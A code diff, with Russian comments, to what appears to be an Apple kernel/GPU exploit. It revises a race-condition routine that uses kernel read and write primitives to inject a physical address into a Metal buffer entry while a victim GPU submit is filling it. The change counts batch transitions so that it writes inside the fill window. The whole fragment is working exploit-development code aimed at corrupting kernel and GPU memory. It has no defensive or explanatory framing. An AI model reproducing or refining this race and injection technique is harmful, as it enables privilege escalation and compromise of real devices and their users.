@@ -5612,10 +5612,9 @@ static void *kpListReaderMulti(void *arg)
     }
     GNOTE( [NSString stringWithFormat:@"  БАЗА: paX в 0x17 ДО гонки: %d %@", baseHits, baseHits ? @"(уже там?!)" : @"= 0, чисто"]);
 
-    // 4. ОДИНОЧНЫЙ выстрел в широкое окно: 256 МБ буфер = fill идёт долго.
-    //    Тред A: submit (шейдер читает gvaB[0] → res[0]). Главный: ждём,
-    //    пока запись[0] ненулевая (fill активен) → ОДНА запись {1, paX} →
-    //    снова (до 50). Без молотилки: коррупции почти нет.
+    // 4. ЛОВЛЯ ПЕРЕХОДОВ: протухшие записи не чистятся между пачками —
+    //    «ненулево» ≠ «fill идёт». Ловим СМЕНУ значения записи[0] (новая
+    //    пачка началась) и пишем мгновенно: окно = fill пачки → c4.
     gSubmitDone = 0;
     {
         id<MTLDevice> mtl0 = MTLCreateSystemDefaultDevice();
@@ -5624,17 +5623,20 @@ static void *kpListReaderMulti(void *arg)
     }
     pthread_t vt;
     pthread_create(&vt, NULL, kpVictimSubmit, NULL);
-    int writes = 0;
+    int writes = 0, transitions = 0;
+    uint64_t prev = kp_rc_kread64(bufVA);
     while (!gSubmitDone && writes < 50) {
-        uint64_t f0 = kp_rc_kread64(bufVA);          // запись[0].qword0
-        if (f0) {
-            kp_rc_kwrite64(bufVA + 8, 1);            // qword1=1 сначала
-            kp_rc_kwrite64(bufVA, paX);              // qword0 = paX
+        uint64_t f0 = kp_rc_kread64(bufVA);
+        if (f0 != prev && f0) {
+            transitions++;                       // пачка началась
+            kp_rc_kwrite64(bufVA + 8, 1);          // qword1=1 сначала
+            kp_rc_kwrite64(bufVA, paX);            // qword0 = paX
             writes++;
+            prev = f0;
         }
     }
     pthread_join(vt, NULL);
-    GNOTE( [NSString stringWithFormat:@"  одиночный выстрел: %d записей в активные fill'ы", writes]);
+    GNOTE( [NSString stringWithFormat:@"  ловля переходов: %d переходов, %d записей", transitions, writes]);
 
     // read-back: что шейдер прочитал по gvaB[0] большого буфера
     uint64_t got = 0;
